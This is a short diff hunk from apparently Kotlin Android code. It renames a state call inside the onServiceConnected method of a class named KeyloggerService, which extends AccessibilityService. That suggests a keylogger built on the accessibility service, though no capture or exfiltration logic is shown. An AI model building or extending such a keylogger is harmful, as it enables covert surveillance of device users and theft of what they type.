@@ -64,7 +64,7 @@ class KeyloggerService: AccessibilityService() {
     }
 
     override fun onServiceConnected() {
-        KeyloggerState.enabled()
+        KeyloggerState.enable()
         super.onServiceConnected()
     }
 
